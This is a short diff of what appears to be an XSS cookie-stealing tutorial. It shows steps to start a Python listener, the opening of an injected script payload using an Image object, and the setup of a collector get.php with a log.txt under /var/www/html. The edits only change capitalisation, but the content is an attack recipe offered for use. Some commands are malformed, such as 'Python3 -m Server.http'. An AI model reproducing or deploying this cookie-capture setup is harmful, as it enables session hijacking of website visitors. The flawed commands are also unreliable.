@@ -24,7 +24,7 @@ YasserREED > Python3 -m Server.http 3333 <- Any Port You Like!
 
 YasserREED> Python3 -m Server.http 3333 <- Any Port You Like!
 
-2- write the Pyaload:
+2- Write the Pyaload:
 
 <script>
     var i = new Image();
@@ -38,15 +38,15 @@ YasserREED> Python3 -m Server.http 3333 <- Any Port You Like!
 
 [~] YasserREED> cd  /var/www/html
 
-2- make File get.php:
+2- Make File get.php:
 
 YasserrEED> sudo gedit get.php
 
 // Code with the File Just Copy it 
 
-2- make log.txt
+2- Make log.txt file:
 
-YasserrEED> sudo touch log.txt
+YasserRED> sudo touch log.txt
 
 3- give all Privileges:
 
